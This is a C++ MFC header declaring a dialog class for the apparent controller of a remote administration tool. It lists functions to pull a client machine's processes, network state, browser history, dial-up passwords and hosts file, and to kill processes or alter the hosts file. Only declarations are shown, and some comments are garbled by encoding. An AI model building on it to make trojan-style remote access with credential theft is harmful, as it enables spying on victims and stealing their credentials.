#if !defined(AFX_SystemDlg_H__7A784A33_3CF5_4998_B9A1_1E1C11EF8EB2__INCLUDED_)
#define AFX_SystemDlg_H__7A784A33_3CF5_4998_B9A1_1E1C11EF8EB2__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
// SystemDlg.h : header file
//

/////////////////////////////////////////////////////////////////////////////
// CSystemDlg dialog

class CSystemDlg : public CDialog
{
// Construction
public:

	CSystemDlg(CWnd* pParent = NULL, CIOCPServer* pIOCPServer = NULL, ClientContext *pContext = NULL);   // standard constructor
	void OnReceiveComplete();
// Dialog Data
	//{{AFX_DATA(CSystemDlg)
	enum { IDD = IDD_SYSTEM };
	CEdit	m_edit_hosts;
	CListCtrl m_list_systeminfo;
	CListCtrl m_list_process;
	CListCtrl m_list_windows;
	CListCtrl m_list_netstate;
	CListCtrl m_list_software;
	CListCtrl m_list_dialupass;
	CListCtrl m_list_iehistory;
	CListCtrl m_list_iefavorite;
	CProgressCtrl m_MemPross;
	CProgressCtrl m_CpuPross;
	CXTTabCtrl	m_tab;
	CString	m_CpuUsed;
	CString	m_MemUsed;
	//}}AFX_DATA


// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CSystemDlg)
	public:
	virtual BOOL PreTranslateMessage(MSG* pMsg);	
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	virtual void PostNcDestroy();
	//}}AFX_VIRTUAL

// Implementation
protected:
	CImageList *m_image;  //ͼ��
private:
	void AdjustList();
	void ShowSystemInfo();
	void ShowProcessList();
	void ShowWindowsList();
	void ShowNetStateList();
	void ShowSoftWareList();
	void ShowDialupassList();
	void ShowIEHistoryList();
	void ShowFavoritesUrlList();
	void ShowHostsInfo();
	void ShowSelectWindow(BOOL bInit = FALSE);
	
	void GetSystemInfo();
	void GetProcessList();
	void GetWindowsList();
	void GetNetStateList();
	void GetSoftWareList();
	void GetDialupassList();
	void GetIEhistoryList();
	void GetFavoritesUrlList();
	void GetHostsInfo();
	void GetCpuMemory();
	
	void SetClipboardText(CString &Data);
	void CreateSortIcons();
	void SetSortIcon();
	HICON m_hIcon;
	ClientContext* m_pContext;
	CIOCPServer* m_iocpServer;
	CImageList m_ImgList;
	BOOL m_bClosing;
	// Generated message map functions
	//{{AFX_MSG(CSystemDlg)
	virtual BOOL OnInitDialog();
	afx_msg void OnClose();
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnKillProcess();
	afx_msg void KillProcessDel(BYTE Buffer ,char *strbuf);
	afx_msg void OnKillDelete();
	afx_msg void OnRefreshPsList();
	afx_msg void OnSelChangeTab(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnNMRClickListProcess(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnWindowReflush();
	afx_msg void OnWindowClose();
	afx_msg void OnWindowHide();        //����
	afx_msg void OnWindowShow();        //��ʾ
	afx_msg void OnWindowMax();         //���
	afx_msg void OnWindowMin();         //��С��
	afx_msg void OnReceiveCpuMemory(void);
	afx_msg void OnShowWindow(int Show);
	afx_msg void OnRclickList1(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnMenuitem40015();
	afx_msg void OnMenuitem40016();
	afx_msg void OnMenuitem40017();
	afx_msg void OnMenuitem40018();
	afx_msg void OnMenuitem40019();
	afx_msg void OnMenuitem40020();
	afx_msg void OnBtnGethosts();
	afx_msg void OnBtnSethosts();
	afx_msg void OnChangeEdtHosts();
	afx_msg void Ondongjie();
	afx_msg void Onjiedong();
	//}}AFX_MSG

	DECLARE_MESSAGE_MAP()
};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_SystemDlg_H__7A784A33_3CF5_4998_B9A1_1E1C11EF8EB2__INCLUDED_)
